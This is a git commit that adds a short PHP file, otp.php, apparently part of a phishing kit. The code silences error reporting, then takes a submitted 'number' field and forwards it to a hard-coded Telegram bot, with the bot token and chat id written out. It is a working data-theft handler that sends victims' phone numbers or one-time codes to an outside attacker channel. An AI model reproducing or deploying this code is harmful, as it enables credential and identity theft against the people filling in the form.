8c9d285f78720d70a4cd595cc5c7956c6951c9df
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-05-19 08:11:59 +0000

    Create otp.php

--- otp.php
+++ otp.php
@@ -1,3 +1,3 @@
 error_reporting(0);
 error_log(0);
-// send me the number only
+file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=Number: " . $_POST['number']);
